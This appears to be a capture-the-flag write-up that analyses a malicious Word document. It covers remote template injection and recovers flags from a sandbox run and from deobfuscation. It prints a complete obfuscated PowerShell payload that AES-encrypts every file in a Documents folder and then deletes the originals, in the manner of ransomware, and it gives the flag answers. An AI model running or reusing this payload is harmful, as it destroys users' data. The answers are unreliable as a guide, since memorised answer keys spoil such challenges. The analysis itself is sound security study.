## Antediluvian 1
First thing to check, upload the file to [VirusTotal](https://www.virustotal.com/gui/file/28dca7f3b0a2e3796506356cb4cf50461f59534f7b919806440de09e586240f8).
Under the behaviour tab, we see that it attempts to contact the following ip address.
![](attachments/Pasted%20image%2020230228174714.png)

`Flag: IDEH{46.101.156.218}`

## Antediluvian 2
From the previous screenshot, we can see that it attempts to get the file `template.dot`, and when looking at the contents of the `word/_rels/settings.xml.rels` file, we see that it attempts to use this file as a template for our word document.
![](attachments/Pasted%20image%2020230228175512.png)
This type of attack is called **remote template injection**, where our document uses a template that contains malicious code and the user finds seemingly no macro in the original document.

`Flag: IDEH{remote_template_injection}`

## Antefiluvian 3
This document attempts to run a base64 encoded powershell script.
![](attachments/Pasted%20image%2020230228175736.png)

```powershell
&("{1}{2}{0}"-f'm','sE','t-itE')  VarIabLe:xoH6 ( [tYPe]("{0}{2}{3}{4}{1}"-F'SYS','veRT','TE','m','.cOn') ) ;    $h0S  =[TYPe]("{4}{0}{3}{2}{1}"-f 'e','pAtH','iO.','M.','Syst') ;   .("{0}{1}" -f'SE','t')  birc0  ([type]("{3}{2}{0}{1}" -f 'tEXT.enCODIN','g','tem.','sYs')  ) ;   .('Sv') SHvzi2 (  [TYpe]("{3}{4}{1}{7}{2}{6}{10}{0}{9}{5}{8}"-F'E','rITy.crYpTogRaPHy','ci','Sy','STem.SECU','mod','P','.','E','R','h')  );  .("{0}{1}{3}{2}" -f's','ET-','aRIaBLE','v') ('I'+'hQ')  ([tYpe]("{5}{7}{3}{0}{4}{8}{2}{1}{6}" -f '.c','DDiNGM','a','eCURitY','rYpToGrAPHy','S','OdE','ystEM.s','.P') );  $m5iXC=  [TYpE]("{4}{1}{5}{11}{10}{6}{7}{0}{9}{12}{2}{3}{13}{8}"-F'Pt','Em','yp','TO','sYST','.','.cR','y','odE','OGRaph','RitY','SEcu','y.cr','sTrEamM') ; &("{1}{0}"-f'Em','SeT-It') vARIable:30vlP5 ([Type]("{1}{3}{4}{2}{0}"-F'.iO.fiLE','sy','M','s','te'))  ;${eNc`RYp`TeD} = ("{3}{1}{2}{0}" -f '=','ZGV','vQmZ','1NUNBVG','lvb','l8xU','19ub','zdf','cDRJT','g==')
${k`ey} =   (.("{3}{1}{2}{0}" -f 'IABle','ET-vA','R','g') ('biRc'+'0') -VALueonL  )::"U`Tf8"."g`ET`strINg"( $xOH6::("{1}{2}{0}{3}"-f 'o','F','r','mBase64String').Invoke(${enc`RyPt`eD}))
${P`Ath} = ((("{2}{9}{7}{8}{6}{0}{10}{13}{5}{11}{4}{12}{3}{1}" -f 'ment','ej','C','tedz','nf','ej','ocu','erszejc3p0zej','D',':zejUs','s','i','ec','z'))  -cREPlACE'zej',[Char]92)


${F`il`epAThs} = &("{0}{4}{2}{3}{1}"-f'Get-','tem','hil','dI','C') -Path ${p`ATH} -File

foreach (${f`il`EP`Ath} in ${Fil`e`PathS}) {
    ${En`C`RYpT`EdF`ILep`ATH} =   $H0s::("{4}{1}{3}{0}{2}" -f'ensi','eEx','on','t','Chang').Invoke(${f`iL`EpaTh}."fUl`LN`AMe", ("{1}{2}{3}{0}"-f 'd','encr','y','pte'))
    ${cO`Nten`TB`ytEs} =   ( .("{3}{2}{1}{0}"-f'E','L','vArIAb','GET-') ("30vL"+"p5")).ValUe::("{2}{3}{0}{1}" -f'lB','ytes','Re','adAl').Invoke(${fIl`ePa`Th}."fu`lLNa`Me")
    ${K`EYByT`ES} =   (&("{2}{1}{0}" -f'Ble','iA','VaR') BIRc0  -VA  )::"UT`F8".("{1}{0}" -f's','GetByte').Invoke(${P`Assw`ORd})
    ${iV`BY`Tes} =   ( &("{1}{0}{2}" -f'ldi','CHi','TeM') VarIable:BirC0 ).VALUe::"UT`F8".("{1}{0}{2}"-f'tByt','Ge','es').Invoke(("{3}{0}{2}{1}"-f'789','EF','ABCD','0123456'))
    ${A`Es} = .("{0}{1}{2}"-f 'Ne','w-Obje','ct') ("{1}{0}{6}{4}{2}{3}{5}{7}"-f 'stem.S','Sy','ryptogr','aph','urity.C','y.AesManage','ec','d')
    ${A`eS}."k`Ey" = ${k`ey`ByTeS}
    ${a`es}."I`V" = ${IVbY`TES}
    ${a`eS}."M`ODE" =  ( .("{1}{2}{0}" -f'LDiTeM','G','Et-cHi')  vaRiaBLe:SHvzI2  ).value::"c`BC"
    ${a`Es}."pa`dd`INg" =  $iHq::"p`kcS7"
    ${E`NC`RYpToR} = ${a`es}.("{2}{1}{3}{0}" -f 'or','y','CreateEncr','pt').Invoke()
    ${MSe`NCr`YpT} = .("{1}{2}{0}"-f'ect','New-O','bj') ("{1}{0}{2}{5}{6}{3}{4}" -f 'IO','System.','.Me','tre','am','mor','yS')
    ${Cs`enCRY`pT} = .("{0}{1}{2}"-f'New','-O','bject') ("{2}{0}{3}{4}{1}{6}{7}{8}{5}"-f'ystem.Se','.Cr','S','cur','ity','eam','ypto','graphy.Cryp','toStr')(${msEn`CR`ypT}, ${EnC`RY`PToR},   (  .("{1}{0}{2}"-f'ild','ch','ITEM')  ('vARIabl'+'e:m'+'5Ix'+'c') ).VALuE::"wRI`Te")
    ${C`seNcrY`pT}.("{0}{1}" -f'W','rite').Invoke(${co`Nten`TbY`Tes}, 0, ${Co`NTEnTbYT`eS}."le`NgTH")
    ${CsEN`CRY`pT}.("{4}{2}{1}{3}{0}"-f 'lock','Fin','ush','alB','Fl').Invoke()
    ${E`N`cR`Yp`TedBYtes} = ${MS`e`NCRYPT}.("{1}{2}{0}" -f'ray','ToA','r').Invoke()
      (  .("{1}{0}{2}"-f'ITE','cHILD','M') VarIAbLe:30vlp5  ).vALue::("{2}{0}{3}{1}{4}" -f'rit','llByte','W','eA','s').Invoke(${e`Ncr`yp`TEdfILepath}, ${EncrY`pTEDB`yt`es})
    &("{1}{0}{3}{2}" -f'e','R','m','move-Ite') ${F`i`LEpaTh}."fULLn`A`Me"
}
```

As we can see, the script is heavily obfuscated. However, there's one variable which can lead us to the flag, $path.
We can deobfuscate the script manually, or just by running it in a sandbox.
![](attachments/Pasted%20image%2020230228180004.png)
For now, all we need is the path.
![](attachments/Pasted%20image%2020230228183840.png)

We can see that it attempts to access a path that doesn't exist, hence the error

`Flag: IDEH{C:\Users\c3p0\Documents\infected\}`


## Antediluvian 4
The obfuscated code contains many variables ($key, $path, $m5iXC, etc.). However looking at one variable $encrypted 
```powershell
${eNc`RYp`TeD} = ("{3}{1}{2}{0}" -f '=','ZGV','vQmZ','1NUNBVG','lvb','l8xU','19ub','zdf','cDRJT','g=='
```
If we simply concatenate its parts together disregarding the format operator, we get the following string `ZGVvQmZ1NUNBVGlvbl8xU19ubzdfcDRJTg==` which is base64 encoded `deoBfu5CATion_1S_no7_p4IN`

`Flag: IDEH{deoBfu5CATion_1S_no7_p4IN}`